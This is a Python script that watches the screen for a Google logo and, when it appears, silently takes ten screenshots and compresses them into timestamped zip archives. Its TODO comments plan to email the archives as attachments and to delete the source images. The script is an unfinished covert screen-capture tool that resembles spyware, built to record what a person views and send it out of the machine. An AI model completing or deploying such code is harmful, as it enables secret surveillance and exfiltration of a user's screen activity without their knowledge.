import pyautogui, pyscreeze, time, os, zipfile

#TODO delete images from the data folder after compression
#TODO implement email attachments
#TODO if a folder doesn't exist, create it
#TODO dinamic image to locate

current_path = os.path.dirname(os.path.realpath(__file__))

def getCurrentDateTime():
	current_date_time = time.localtime()
	formatted_time = time.strftime('%Y%m%d-%H%M%S', current_date_time)
	return formatted_time

def createZip():
	date_time = getCurrentDateTime()
	zip_file = zipfile.ZipFile(current_path + '/compressed_data/images_' + date_time + '.zip', mode='w', compression=zipfile.ZIP_DEFLATED)
	data_dir = current_path + '/data/'
	for file in os.listdir(data_dir):
		zip_file.write(os.path.join(data_dir, file))
	zip_file.close()

def takeScreenshots(amount, interval):
	for i in range(0, amount):
		date_time = getCurrentDateTime()
		pyautogui.screenshot(current_path +'/data/image'+ str(i + 1) + '_' + date_time +'.png')
		time.sleep(interval)

if __name__ == '__main__':
	while True:
		print(current_path)
		try:
			pyautogui.locateOnScreen(current_path +'/sources/google_logo_1.png', confidence = 0.9) # Locate the image on screen with a confidence of 90%
			takeScreenshots(10, 4) # When it's located take 10 screenshots with a interval of 4 seconds
			createZip()
		except pyscreeze.ImageNotFoundException:
			try:
				pyautogui.locateOnScreen(current_path + '/sources/google_logo_2.png', confidence=0.9)
				takeScreenshots(10, 4)
				createZip()
			except pyscreeze.ImageNotFoundException:
				pass
		time.sleep(1) # Reduces the cpu usage by about 10% while the image isn't located. Total usage between 3.5% and 5%